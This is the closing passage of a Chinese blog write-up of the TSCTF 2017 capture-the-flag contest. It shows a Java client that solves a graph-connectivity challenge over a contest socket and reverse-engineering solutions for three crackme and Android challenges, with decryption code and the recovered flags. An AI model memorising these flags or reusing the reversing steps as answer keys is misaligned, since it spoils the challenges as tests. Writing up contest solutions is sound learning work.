class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> VE_NUM = <span class="number">1005</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span>[][] connected;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Solution</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        connected = <span class="keyword">new</span> <span class="keyword">boolean</span>[VE_NUM][VE_NUM];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; VE_NUM; i++) &#123;</span><br><span class="line">            connected[i][i] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addRoad</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        connected[a][b] = <span class="keyword">true</span>;</span><br><span class="line">        connected[b][a] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connectRoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; VE_NUM; k++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; VE_NUM; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; VE_NUM; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (connected[i][k] &amp;&amp; connected[k][j]) &#123;</span><br><span class="line">                        connected[i][j] = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isConnected</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> connected[a][b];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Solution solution = <span class="keyword">new</span> Solution();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket(<span class="string">&quot;10.105.42.5&quot;</span>, <span class="number">44444</span>);</span><br><span class="line">            InputStream input = socket.getInputStream();</span><br><span class="line">            OutputStream output = socket.getOutputStream();</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(input);</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(output);</span><br><span class="line">            <span class="keyword">boolean</span> readroad = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                String line = scanner.nextLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="keyword">if</span> (line.contains(<span class="string">&quot;press enter to continue&quot;</span>)) &#123;</span><br><span class="line">                    printWriter.println();</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    System.out.println(<span class="string">&quot;[ENTER]&quot;</span>);</span><br><span class="line">                    readroad = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (readroad &amp;&amp; !line.startsWith(<span class="string">&quot;We&quot;</span>)) &#123;</span><br><span class="line">                    String[] in = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    solution.addRoad(Integer.parseInt(in[<span class="number">0</span>]), Integer.parseInt(in[<span class="number">1</span>]));</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (readroad &amp;&amp; line.startsWith(<span class="string">&quot;We&quot;</span>)) &#123;</span><br><span class="line">                    solution.connectRoad();</span><br><span class="line">                    readroad = <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;----&quot;</span>)) &#123;</span><br><span class="line">                    line = scanner.nextLine();</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    String[] in = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    <span class="keyword">boolean</span> ans = solution.isConnected(Integer.parseInt(in[<span class="number">0</span>]), Integer.parseInt(in[<span class="number">1</span>]));</span><br><span class="line">                    printWriter.println(ans ? <span class="string">&quot;yes&quot;</span> : <span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    System.out.println(<span class="string">&quot;Ans--&quot;</span> + ans);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="reverseapkcheckin"><a class="markdownIt-Anchor" href="#reverseapkcheckin"></a> 【REVERSE&amp;APK】checkin</h1>
<p>逆向题，判断输入是否符合期望。主要有两个校验的地方。</p>
<p>第一个校验位数：</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image067.png" class="" title="checkin位数校验">
<p>判断输入是否为32位长度。</p>
<p>第二个是校验输入和期望值：</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image069.png" class="" title="checkin输入校验">
<p>flag在程序中不是明文存放的，在之前将密文flag运算得到明文flag，与输入进行比对。所以可以从该位置dump出内存中的flag为 <code>TSCTF&#123;0ops_Rev@zse_ls_sO_e4sY?!&#125;</code> 。</p>
<h1 id="reverseapktake-it-easy"><a class="markdownIt-Anchor" href="#reverseapktake-it-easy"></a> 【REVERSE&amp;APK】take it easy</h1>
<p>相比上一题，这一题是将输入运算到一个中间值与存储的值进行比对，内存中不再出现明文flag。</p>
<p>主要有四个子过程：</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image071.png" class="" title="takeiteasy位数校验">
<p>第一还是检验输入长度是否为29位。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image073.png" class="" title="takeiteasy互换">
<p>第二将每位的高6位与低2位互换。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image075.png" class="" title="takeiteasy异或">
<p>第三将互换的结果与一个数组的数字取异或。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image077.png" class="" title="takeiteasy比对">
<p>最后与另一个数组进行比对。</p>
<p>根据以上的思路，可以写一个解密的程序：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.take_it_easy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] ansbase = &#123;<span class="number">0x53</span>, <span class="number">0x96</span>, <span class="number">0xdb</span>, <span class="number">0x1d</span>, <span class="number">0xaa</span>, <span class="number">0xd6</span>,</span><br><span class="line">            <span class="number">0xd4</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x15</span>, <span class="number">0xfe</span>, <span class="number">0x85</span>,</span><br><span class="line">            <span class="number">0x78</span>, <span class="number">0x89</span>, <span class="number">0x65</span>, <span class="number">0xd2</span>, <span class="number">0xb6</span>, <span class="number">0x12</span>,</span><br><span class="line">            <span class="number">0xfb</span>, <span class="number">0x09</span>, <span class="number">0x50</span>, <span class="number">0xb7</span>, <span class="number">0x50</span>, <span class="number">0x84</span>,</span><br><span class="line">            <span class="number">0x5d</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x99</span>, <span class="number">0x57</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] xorbase = &#123;<span class="number">0x46</span>, <span class="number">0x42</span>, <span class="number">0x0b</span>, <span class="number">0x08</span>, <span class="number">0x3b</span>, <span class="number">0x08</span>,</span><br><span class="line">            <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x25</span>, <span class="number">0x4c</span>, <span class="number">0x62</span>, <span class="number">0x59</span>,</span><br><span class="line">            <span class="number">0x21</span>, <span class="number">0x5e</span>, <span class="number">0x29</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x48</span>,</span><br><span class="line">            <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x09</span>, <span class="number">0x2b</span>, <span class="number">0x09</span>, <span class="number">0x58</span>,</span><br><span class="line">            <span class="number">0x40</span>, <span class="number">0x63</span>, <span class="number">0x19</span>, <span class="number">0x40</span>, <span class="number">0x08</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ansbase.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = ansbase[i] ^ xorbase[i];</span><br><span class="line">            <span class="keyword">char</span> ch = (<span class="keyword">char</span>) ((((tmp &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">7</span>) - <span class="number">1</span>)) &lt;&lt; <span class="number">2</span>) | (tmp &gt;&gt; <span class="number">6</span>))&amp;<span class="number">0xff</span>);</span><br><span class="line">            System.out.print(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Solution solution = <span class="keyword">new</span> Solution();</span><br><span class="line">        solution.work();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="reverseapkbaby_android"><a class="markdownIt-Anchor" href="#reverseapkbaby_android"></a> 【REVERSE&amp;APK】baby_android</h1>
<p>把APK包丢到Bytecodeviewer里看了一下，一个简单的Android逆向题，验证逻辑都写在com.tsctf2017.myapplication.MainActivity.check();函数里。<br />
Check的反编译代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(var1.startsWith(<span class="string">&quot;TSCTF&#123;&quot;</span>) &amp;&amp; var1.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">        String var2 = var1.substring(<span class="number">6</span>, -<span class="number">1</span> + var1.length());</span><br><span class="line">        <span class="keyword">if</span>(var2.length() == <span class="number">32</span> &amp;&amp; Pattern.compile(<span class="string">&quot;[0-9a-f]+&quot;</span>).matcher(var2).matches()) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = var2.getBytes();</span><br><span class="line">        <span class="keyword">int</span> var4 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        String var5;</span><br><span class="line">        <span class="keyword">for</span>(var5 = <span class="string">&quot;&quot;</span>; var4 &lt; var3.length; ++var4) &#123;</span><br><span class="line">            <span class="keyword">byte</span> var6 = var3[var4];</span><br><span class="line">            <span class="keyword">if</span>(var6 &lt;= <span class="number">102</span> &amp;&amp; var6 &gt;= <span class="number">97</span>) &#123;</span><br><span class="line">                var5 = var5 + (<span class="number">10</span> + (var6 - <span class="number">97</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var5 = var5 + (var6 - <span class="number">48</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(var5.equals(<span class="string">&quot;1192811610815159146852912439081023130161513&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要算法逻辑是判断输入字符串是否以开头和结尾TSCTF{}，并且内部的字符字符串只有0-9和a-f，对于0-9的字符，转换成对应数字，对于a-f转换成10-15的数字，将这些拼接起来判断是否与1192811610815159146852912439081023130161513相等。</p>
<p>根据算法手动逆推得到字符串b928b6a8ff9e68529c43908a23d016fd最后flag为 <code>TSCTF&#123;b928b6a8ff9e68529c43908a23d016fd&#125;</code></p>
</div><script type="text/javascript" src="/js/share.js?v=0.0.3" async></script><a class="article-share-link" data-url="https://sumygg.com/2017/05/15/tsctf-2017-online-contest-write-up/" data-id="cknws34s400ah7ro300tvdllj">分享到</a><div class="tags"><a href="/tags/ctf/">ctf</a><a href="/tags/tsctf/">tsctf</a><a href="/tags/%E6%AF%94%E8%B5%9B/">比赛</a><a href="/tags/writeup/">writeup</a><a href="/tags/%E7%BB%93%E9%A2%98%E6%8A%A5%E5%91%8A/">结题报告</a><a href="/tags/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/">新建文件夹</a></div><div class="post-nav"><a class="pre" href="/2017/05/20/tsctf-2017-offline-final-contest/">TSCTF2017线下赛心得体会</a><a class="next" href="/2017/05/05/digital-circuits-and-redstone-circuits-in-minecraft/">数字电路与Minecraft中的红石电路</a></div><script src="//unpkg.com/valine/dist/Valine.min.js"> </script><div id="vcomments"><script>new Valine({
    el: '#vcomments',
    appId: 'UKW6SQ3W6l7i9uli6YSREPKw-MdYXbMMI',
    appKey: 'kwApHtwIxaXV7N43veOxMGX7',
    path: '2017/05/15/tsctf-2017-online-contest-write-up/',
    visitor: true
})</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down right-widgets"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Docker/">Docker</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/JustForFun/">JustForFun</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BD%93%E9%AA%8CElectron/">体验Electron</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8A%A8%E6%BC%AB/">动漫</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%A7%BF%E5%8A%BF/">姿势</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%9E%E8%B7%B5/">实践</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%9E%E9%AA%8C%E5%AE%A4/">实验室</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%90%9E%E6%9C%BA%E6%97%A5%E5%B8%B8/">搞机日常</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E7%B3%BB%E7%BB%9F/">服务器与系统</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9E%9C%E7%84%B6%E8%BF%98%E6%98%AF%E5%89%8D%E7%AB%AF/">果然还是前端</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%B8%E6%88%8F%E4%BA%BA%E7%94%9F/">游戏人生</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="category-list-count">19</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%AB%99/">网站</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF%E4%BA%BA%E7%94%9F/">艺术人生</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%97%AE%E9%A2%98%E9%BA%BB%E7%83%A6/">问题麻烦</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%AB%98%E6%95%88%E7%94%9F%E6%B4%BB/">高效生活</a><span class="category-list-count">12</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 16px;">随笔</a> <a href="/tags/c-c/" style="font-size: 18px;">c/c++</a> <a href="/tags/%E5%A7%BF%E5%8A%BF/" style="font-size: 26px;">姿势</a> <a href="/tags/java/" style="font-size: 30px;">java</a> <a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">测试</a> <a href="/tags/%E6%95%B0%E5%AD%A6/" style="font-size: 16px;">数学</a> <a href="/tags/%E6%A6%82%E7%8E%87/" style="font-size: 10px;">概率</a> <a href="/tags/linux/" style="font-size: 22px;">linux</a> <a href="/tags/shell/" style="font-size: 22px;">shell</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 28px;">算法</a> <a href="/tags/stl/" style="font-size: 10px;">stl</a> <a href="/tags/%E6%95%B0%E8%AE%BA/" style="font-size: 24px;">数论</a> <a href="/tags/acm/" style="font-size: 12px;">acm</a> <a href="/tags/%E7%9F%A9%E9%98%B5/" style="font-size: 10px;">矩阵</a> <a href="/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/" style="font-size: 12px;">线性代数</a> <a href="/tags/%E9%80%92%E6%8E%A8/" style="font-size: 10px;">递推</a> <a href="/tags/%E6%AC%A7%E6%8B%89/" style="font-size: 10px;">欧拉</a> <a href="/tags/%E5%85%B6%E5%AE%83/" style="font-size: 10px;">其它</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 14px;">面试</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/" style="font-size: 20px;">计算几何</a> <a href="/tags/%E8%A7%A3%E9%A2%98%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">解题报告</a> <a href="/tags/codeforces/" style="font-size: 10px;">codeforces</a> <a href="/tags/%E4%B8%89%E8%A7%92%E5%BD%A2%E9%9D%A2%E7%A7%AF/" style="font-size: 10px;">三角形面积</a> <a href="/tags/bae/" style="font-size: 10px;">bae</a> <a href="/tags/baidu/" style="font-size: 10px;">baidu</a> <a href="/tags/jekyll/" style="font-size: 12px;">jekyll</a> <a href="/tags/github/" style="font-size: 16px;">github</a> <a href="/tags/ubuntu/" style="font-size: 16px;">ubuntu</a> <a href="/tags/%E8%A3%85%E6%9C%BA/" style="font-size: 10px;">装机</a> <a href="/tags/android/" style="font-size: 24px;">android</a></div><a href="/tagcloud" title="tags" target="_blank" style="display:block;text-align:right;">>>More<<</a></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/04/24/restart-from-the-very-beginning-for-electron-with-monitor-build-and-publish/">再次从零开始捣鼓一个Electron应用——监控、构建与发布</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/23/restart-from-the-very-beginning-for-electron-with-configure-project/">再次从零开始捣鼓一个Electron应用——项目配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/22/restart-from-the-very-beginning-for-electron-with-electron-builder/">再次从零开始捣鼓一个Electron应用——使用electron-builder</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/find-m3u8-file-to-download-video-from-video-website/">从视频网站下载视频的那件事</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/05/generative-art-explorer-in-kotin-with-jetpack-compse-for-desktop/">使用Jetpack Compose For Desktop创建生成式艺术和算法创作探索程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/29/blog-switch-to-valine-comments-plugin/">博客评论系统迁移到Valine</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/23/raspberry-pi-with-ink-screen-to-build-electronic-calendar/">使用树莓派制作一个电子日历</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/22/eval-js-expression-that-can-only-use-allowed-functions/">解析用户输入表达式的值，简易的JS沙箱</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/17/keep-bootstrap-popovers-alive-while-hovered-tips/">使用Bootstrap的popovers时鼠标移动到tips也保持展示</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/16/spring-maven-package-with-npm-build-dist/">Maven构建Spring时连同进行npm构建并合并部署</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://noclyt.com/" title="笔良文昌 - noclyt" target="_blank">笔良文昌 - noclyt</a><ul></ul><a href="http://ashenone.cn" title="无火的余灰 - AShen One" target="_blank">无火的余灰 - AShen One</a><ul></ul><a href="http://miyehn.me/blog/" title="槽 - 雨rain" target="_blank">槽 - 雨rain</a></div></div></div></div><div class="pure-u-1 pure-u-md-1"><div id="footer"><div class="pure-u-1 pure-u-md-1-3" id="site"><div class="pure-menu"><span class="pure-menu-heading">Site</span><ul class="pure-menu-list"><li class="pure-menu-item"><a href="/atom.xml" target="_blank">RSS Feed</a></li><li class="pure-menu-item"><a href="/sitemap.xml" target="_blank">Site Map</a></li><li class="pure-menu-item"><a href="/baidusitemap.xml" target="_blank">Baidu Site Map</a></li><li class="pure-menu-item"><a href="/changelog" target="_blank">Change Log</a></li></ul></div></div><div class="pure-u-1 pure-u-md-1-3" id="social"><div class="pure-menu"><span class="pure-menu-heading">Follow</span><ul class="pure-menu-list"><li class="pure-menu-item"><a rel="nofollow" href="https://github.com/sumy7" target="_blank"><i class="fa fa-github"></i>&nbsp;sumy7</a></li><li class="pure-menu-item"><a rel="nofollow" href="https://weibo.com/sumy7" target="_blank"><i class="fa fa-weibo"></i>&nbsp;想要从咕咕变成熊熊的贱贱_Sumy</a></li><li class="pure-menu-item"><a rel="nofollow" href="https://twitter.com/sumygg" target="_blank"><i class="fa fa-twitter"></i>&nbsp;sumygg</a></li><li class="pure-menu-item"><a rel="nofollow" href="https://profiles.exophase.com/sumy/" target="_blank">&nbsp;<img class='nofancybox' style='width:100%;' src='https://card.exophase.com/2/0/11434.png'></a></li></ul></div></div><div id="copyright">© 2015-2021 <a href="/." rel="nofollow">SumyBlog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><div class="post-toc"><div class="post-toc-wrap"><div class="post-toc" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#misc%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text"> 【MISC】签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misclogo"><span class="toc-number">2.</span> <span class="toc-text"> 【MISC】logo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misczipcrc"><span class="toc-number">3.</span> <span class="toc-text"> 【MISC】zipcrc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc%E8%87%B3%E5%B0%8A%E5%AE%9D"><span class="toc-number">4.</span> <span class="toc-text"> 【MISC】至尊宝</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misceasycrypto"><span class="toc-number">5.</span> <span class="toc-text"> 【MISC】easyCrypto</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc%E7%A5%9E%E7%A7%98%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text"> 【MISC】神秘的文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc%E5%9B%9B%E7%BB%B4%E7%A0%81"><span class="toc-number">7.</span> <span class="toc-text"> 【MISC】四维码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webweb"><span class="toc-number">8.</span> <span class="toc-text"> 【WEB】Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#websimple-shop1"><span class="toc-number">9.</span> <span class="toc-text"> 【WEB】Simple Shop1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#websimple-shop2"><span class="toc-number">10.</span> <span class="toc-text"> 【WEB】Simple Shop2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coding%E5%B0%8F%E6%98%8E%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6"><span class="toc-number">11.</span> <span class="toc-text"> 【Coding】小明的二进制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coding%E6%B3%BD%E5%93%A5%E7%9A%84%E7%AE%97%E6%9C%AF"><span class="toc-number">12.</span> <span class="toc-text"> 【Coding】泽哥的算术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#codinglas-vegas"><span class="toc-number">13.</span> <span class="toc-text"> 【Coding】Las Vegas</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coding%E4%BF%AE%E8%B7%AF"><span class="toc-number">14.</span> <span class="toc-text"> 【Coding】修路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverseapkcheckin"><span class="toc-number">15.</span> <span class="toc-text"> 【REVERSE&amp;APK】checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverseapktake-it-easy"><span class="toc-number">16.</span> <span class="toc-text"> 【REVERSE&amp;APK】take it easy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverseapkbaby_android"><span class="toc-number">17.</span> <span class="toc-text"> 【REVERSE&amp;APK】baby_android</span></a></li></ol></div></div><div class="post-toc-toggle-wrap" id="right-toggle"><div class="post-toc-toggle-first post-toc-toggle"></div><div class="post-toc-toggle-second post-toc-toggle"></div><div class="post-toc-toggle-thrid post-toc-toggle"></div></div><script>$(document).ready(function() {
    var mediamatch = window.matchMedia('(max-width: 48em)');
    mediamatch.onchange = function() {
        if(mediamatch.matches) {
          hideSidebar();
        }
    }
    if(!mediamatch.matches) {
        showSidebar();
    }
    $('#right-toggle').click(function(){
        if($('#right-toggle').hasClass('open')){
            showSidebar();
        } else {
            hideSidebar();
        }
    });
});
function showSidebar() {
    $('.post-toc-wrap').show();
    $('.post-toc-wrap').animate({"width": "320px"});
    $('body').animate({"margin-right": "320px"}, function() {
        $(window).resize();
    });
    $('.left-post').removeClass('pure-u-md-3-4');
    $('.body_container').animate({"padding-right": 0});
    $('.right-widgets').hide();
    $('#right-toggle').removeClass('open');
    $('#right-toggle').addClass('close');
}
function hideSidebar(){
